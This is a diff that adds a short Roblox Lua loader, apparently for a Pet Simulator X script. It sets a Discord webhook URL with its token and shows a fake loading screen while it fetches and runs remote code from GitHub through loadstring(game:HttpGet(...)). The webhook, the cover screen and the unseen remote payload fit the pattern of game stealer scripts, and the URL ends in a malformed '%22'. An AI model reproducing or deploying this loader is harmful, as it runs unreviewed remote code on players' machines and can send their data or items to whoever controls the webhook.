@@ -1,0 +1,9 @@
+WebHook = "https://discord.com/api/webhooks/1117410391899770921/mVKrBkb4uPP_ejarR_7ow6U_BBSMytyR6EbD-Dy69M__-VM2Qa89GdJJacElGdLZg3p7"
+loadingscreen = true
+_G.Key = "HotDogsAlt01"
+_G.CustomScriptName = "Loading"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script-v4-1.lua%22))()
